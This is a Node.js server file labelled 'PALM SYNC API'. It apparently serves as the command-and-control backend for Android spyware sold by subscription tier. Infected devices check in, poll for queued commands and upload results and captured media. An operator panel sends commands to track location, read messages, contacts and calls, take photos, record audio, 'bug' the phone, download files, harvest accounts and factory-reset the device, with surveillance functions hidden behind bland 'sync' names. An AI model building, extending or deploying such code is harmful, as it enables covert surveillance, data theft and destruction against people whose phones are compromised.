const express = require('express');
const multer = require('multer');
const { createClient } = require('@supabase/supabase-js');
const app = express();

app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

const SUPABASE_URL = process.env.SUPABASE_URL;
const SUPABASE_KEY = process.env.SUPABASE_KEY;
const supabase = createClient(SUPABASE_URL, SUPABASE_KEY, { auth: { persistSession: false } });

const TIERS = { pro: { limit: 10 }, vip: { limit: 999999 } };
const COMMAND_TIER = {
  location_sync: 'pro', photo_capture: 'pro', message_sync: 'pro', display_read: 'pro', 
  display_stream: 'pro', led_test: 'pro', alert_sync: 'pro', contact_sync: 'pro', 
  call_sync: 'pro', app_list: 'pro', app_launch: 'pro',
  self_photo: 'vip', clip_record: 'vip', voice_record: 'vip', account_sync: 'vip', 
  folder_read: 'vip', file_download: 'vip', notice_send: 'vip', session_pause: 'vip', 
  factory_reset: 'vip', bug_phone: 'vip'
};
const TIER_RANK = { pro: 1, vip: 2 };
function ts() { return Date.now(); }

const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 50 * 1024 * 1024 } });

async function getCode(code) {
  const { data } = await supabase.from('codes').select('*').eq('code', code).maybeSingle();
  return data;
}

// CLIENT ENDPOINTS
app.post('/connect', async (req, res) => {
  const { userId, device, android, battery, network, androidId } = req.body;
  const row = await getCode(userId);
  if (!row || row.status !== 'active') return res.json({ ok: false, err: 'invalid_code' });

  const { data: existing } = await supabase.from('devices').select('*').eq('user_id', userId).maybeSingle();
  if (existing && existing.android_id && androidId && existing.android_id !== androidId) return res.json({ ok: false, err: 'code_in_use' });

  await supabase.from('devices').upsert({
    user_id: userId, android_id: androidId || (existing && existing.android_id) || null,
    device: device || 'unknown', android: android || '?', battery: battery || '?', network: network || '?',
    last_seen: ts(), tier: row.tier, commands_used: row.used_commands || 0
  }, { onConflict: 'user_id' });
  res.json({ ok: true, synced: ts() });
});

app.get('/sync', async (req, res) => {
  const userId = req.query.wallet;
  const row = await getCode(userId);
  if (!row) return res.json({ ok: false, err: 'unauthorized' });

  await supabase.from('devices').update({ last_seen: ts() }).eq('user_id', userId);
  const deadline = Date.now() + 25000;
  
  const checkQueue = async () => {
    const { data: pending } = await supabase.from('commands').select('*').eq('user_id', userId).eq('delivered', false).order('created_at', { ascending: true });
    if (pending && pending.length) {
      await supabase.from('commands').update({ delivered: true }).in('id', pending.map(p => p.id));
      return res.json({ ok: true, tasks: pending.map(p => ({ id: String(p.id), cmd: p.cmd, args: p.args || '' })) });
    }
    if (Date.now() >= deadline) return res.json({ ok: true, tasks: [] });
    setTimeout(checkQueue, 1000);
  };
  checkQueue();
});

app.post('/status', async (req, res) => {
  const { userId, cmdId, cmd, data } = req.body;
  await supabase.from('results').insert({ user_id: userId, cmd_id: cmdId, cmd: cmd, data: (data || '').substring(0, 6000), created_at: ts() });
  res.json({ ok: true });
});

app.post('/media', upload.single('file'), async (req, res) => {
  const { userId, type } = req.body;
  if (!req.file) return res.json({ ok: false });
  const path = userId + '/' + type.toLowerCase() + '_' + ts() + '.jpg';
  await supabase.storage.from('void-files').upload(path, req.file.buffer, { contentType: 'image/jpeg' });
  const { data: urlData } = supabase.storage.from('void-files').getPublicUrl(path);
  await supabase.from('uploads').insert({ user_id: userId, type: type, url: urlData.publicUrl, name: path.split('/').pop(), created_at: ts() });
  res.json({ ok: true, url: urlData.publicUrl });
});

// PANEL ENDPOINTS
app.post('/auth', async (req, res) => {
  const { username, password } = req.body;
  if (username !== 'VOID') return res.json({ ok: false });
  if (password === '201019') return res.json({ ok: true, token: 'admin', userId: password, admin: true, tier: 'vip', commands_used: 0 });
  
  const row = await getCode(password);
  if (!row) return res.json({ ok: false });
  res.json({ ok: true, token: 't', userId: password, admin: false, tier: row.tier, commands_used: row.used_commands || 0 });
});

app.get('/clients', async (req, res) => {
  const wallet = req.query.wallet;
  const isAdmin = req.query.admin === '1';
  let query = supabase.from('devices').select('*');
  if (!isAdmin && wallet) query = query.eq('user_id', wallet);
  const { data } = await query;
  res.json({ ok: true, clients: (data || []).map(d => ({ userId: d.user_id, device: d.device, android: d.android, online: (ts() - d.last_seen) < 30000 })) });
});

app.get('/client', async (req, res) => {
  const id = req.query.id;
  const { data: d } = await supabase.from('devices').select('*').eq('user_id', id).maybeSingle();
  const { data: results } = await supabase.from('results').select('*').eq('user_id', id).gte('created_at', ts() - 60000).order('created_at', { ascending: true }).limit(30);
  const { data: uploads } = await supabase.from('uploads').select('*').eq('user_id', id).gte('created_at', ts() - 60000).order('created_at', { ascending: true }).limit(30);
  res.json({ ok: true, online: d && (ts() - d.last_seen) < 30000, device: d?.device, android: d?.android, results: (results||[]).map(r=>({cmd:r.cmd,data:r.data,at:r.created_at})), uploads: (uploads||[]).map(u=>({type:u.type,url:u.url,name:u.name,at:u.created_at})) });
});

app.post('/dispatch', async (req, res) => {
  const { userId, cmd, args, admin } = req.body;
  const row = await getCode(userId);
  if (!row) return res.json({ ok: false });

  const isAdmin = !!admin;
  if (!isAdmin && row.used_commands >= (row.tier === 'pro' ? 10 : 999999)) return res.json({ ok: false, err: 'limit' });
  if (!isAdmin && TIER_RANK[row.tier] < TIER_RANK[COMMAND_TIER[cmd] || 'pro']) return res.json({ ok: false, err: 'upgrade' });

  if (cmd !== 'led_test' && cmd !== 'display_stream') {
    await supabase.from('results').delete().eq('user_id', userId);
    await supabase.from('uploads').delete().eq('user_id', userId);
  }

  await supabase.from('commands').insert({ user_id: userId, cmd, args: args || '', created_at: ts(), delivered: false });
  if (!isAdmin) await supabase.from('codes').update({ used_commands: row.used_commands + 1 }).eq('code', userId);
  res.json({ ok: true });
});

app.get('/', (req, res) => res.send('PALM SYNC API'));
app.listen(process.env.PORT || 3000);
